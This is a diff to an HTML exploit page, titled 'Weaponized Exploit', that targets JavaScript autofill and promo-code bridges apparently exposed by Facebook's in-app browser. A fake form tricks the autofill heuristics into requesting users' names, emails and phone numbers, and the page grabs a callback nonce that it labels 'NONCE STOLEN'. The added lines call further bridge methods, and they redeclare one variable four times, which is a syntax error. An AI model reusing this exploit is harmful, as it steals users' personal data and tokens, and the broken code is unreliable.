@@ -11,7 +11,7 @@
     </style>
 </head>
 <body>
-    <h2>Weaponized Exploit</h2>
+    <h2>Weaponized 2Exploit</h2>
     
     <!-- Fake form to trick Facebook's Autofill heuristics -->
     <form id="fakeForm">
@@ -51,6 +51,13 @@
                     "requested_fields": ["NAME", "EMAIL", "PHONE"]
                 });
                 window._AutofillExtensions.requestAutoFill(requestPayload);
+                window._AutofillExtensions.autofillAppliedStatusesV2(requestPayload);
+                window._AutofillExtensions.formSubmitted(requestPayload);
+                window._AutofillExtensions.getNonce(requestPayload);
+                window._AutofillExtensions.initializeCallbackHandler(requestPayload);
+                window._AutofillExtensions.proactivePromptsContactAutofillData(requestPayload);
+                window._AutofillExtensions.saveAutofillData(requestPayload);
+                window._AutofillExtensions.selectedContactFieldTag(requestPayload);
                 log("requestAutoFill executed! Check for prompt.");
             } catch (e) { log("Execution Failed: " + e.message); }
         }
@@ -61,6 +68,9 @@
                 // Since we know they like JSON, let's pass a JSON string
                 let payload = JSON.stringify({"callbackID": "attackerCallback"});
                 let nonce = window._PromoExtensions.getPromoExtensionNonce(payload);
+                let nonce = window._PromoExtensions.initializePromoExtensionCallbackHandler(payload);
+                let nonce = window._PromoExtensions.requestPromoExtensionPromoCodeAutofill(payload);
+                let nonce = window._PromoExtensions.sendPromoExtensionPromoCodeAutofillResult(payload);
                 log("<span style='color:red;'><b>🚨 NONCE STOLEN:</b></span> " + nonce);
             } catch (e) {
                 log("Promo Failed: " + e.message);
